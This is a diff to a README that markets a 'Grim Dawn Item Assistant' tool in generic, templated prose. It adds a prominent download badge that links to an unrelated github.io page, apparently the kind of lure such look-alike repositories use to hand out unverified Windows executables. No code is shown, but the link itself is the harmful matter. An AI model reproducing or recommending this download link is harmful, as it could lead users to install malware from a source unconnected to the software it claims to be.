@@ -30,6 +30,12 @@ Grim Dawn Item Assistant provides infinite external stash space, powerful search
 
 Whether you're a newcomer or a veteran, Grim Dawn Item Assistant provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Grim Dawn Item Assistant](https://img.shields.io/badge/⬇_DOWNLOAD_Grim+Dawn+Item+Assistant-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
